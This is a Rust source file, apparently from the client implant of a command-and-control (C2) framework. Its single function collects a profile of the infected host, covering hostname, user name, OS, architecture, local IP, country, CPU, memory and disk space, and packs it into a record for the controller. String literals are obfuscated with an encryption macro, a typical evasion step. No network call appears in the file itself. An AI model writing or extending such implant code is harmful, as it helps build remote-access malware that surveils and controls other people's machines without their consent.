use common::error::{C2Error, C2Result};
use common::message::ClientInfo;
use common::sysinfo::{get_country, get_hardware_info, get_hostname, get_local_ip};
use cryptify::encrypt_string;
use uuid::Uuid;

/// Builds the client information structure.
pub async fn build_client_info(client_id_opt: Option<String>) -> C2Result<ClientInfo> {
    let client_id = client_id_opt.unwrap_or_else(|| Uuid::new_v4().to_string());

    let hardware_info_str = get_hardware_info()
        .map_err(|e| C2Error::Other(format!("Failed to get hardware info: {e}")))?;
    let hardware_info: serde_json::Value = serde_json::from_str(&hardware_info_str)
        .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;

    let ip = get_local_ip()
        .await
        .unwrap_or_else(|_| encrypt_string!("127.0.0.1").parse().unwrap())
        .to_string();

    let country_info = tokio::task::spawn_blocking({
        let ip_clone = ip.clone();
        move || get_country(ip_clone).ok()
    })
    .await
    .map_err(|e| {
        C2Error::Other(format!(
            "Failed to spawn blocking task for country info: {e}"
        ))
    })?;

    Ok(ClientInfo {
        id: client_id,
        hostname: get_hostname().unwrap_or_else(|_| encrypt_string!("unknown").to_string()),
        username: std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| encrypt_string!("unknown").to_string()),
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        ip,
        country_info,
        cpu_brand: hardware_info
            .get("cpu_brand")
            .and_then(|v| v.as_str())
            .unwrap_or(encrypt_string!("unknown").as_str())
            .to_string(),
        cpu_frequency: hardware_info
            .get("cpu_frequency_MHz")
            .and_then(|v| v.as_u64())
            .unwrap_or(0),
        cpu_cores: hardware_info
            .get("cpu_cores")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as usize,
        memory: hardware_info
            .get("memory_GB")
            .and_then(|v| v.as_u64())
            .unwrap_or(0),
        total_disk_space: hardware_info
            .get("total_disk_space_GB")
            .and_then(|v| v.as_f64())
            .map(|v| v as u64)
            .unwrap_or(0),
        available_disk_space: hardware_info
            .get("available_disk_space_GB")
            .and_then(|v| v.as_f64())
            .map(|v| v as u64)
            .unwrap_or(0),
        connected_at: chrono::Utc::now(),
        last_seen: chrono::Utc::now(),
    })
}
